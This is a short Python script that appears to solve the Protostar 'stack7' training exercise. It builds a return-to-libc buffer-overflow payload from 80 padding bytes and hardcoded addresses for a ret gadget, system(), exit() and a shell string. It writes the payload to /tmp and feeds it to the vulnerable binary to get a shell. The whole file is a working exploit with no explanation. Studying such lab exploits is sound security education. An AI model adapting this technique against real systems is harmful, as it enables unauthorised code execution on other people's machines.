import os
import struct

offset = 80
shell = struct.pack("I",0xbffff9ee)
exit = struct.pack("I",0xb7ec60c0)
system = struct.pack("I",0xb7ecffb0)
ret = struct.pack("I",0x08048494)

exploit = ("X"*offset)+ret+system+exit+shell

with open("/tmp/stack7", "wb") as f:
        f.write(exploit)

os.system("/opt/protostar/bin/stack7 < /tmp/stack7")
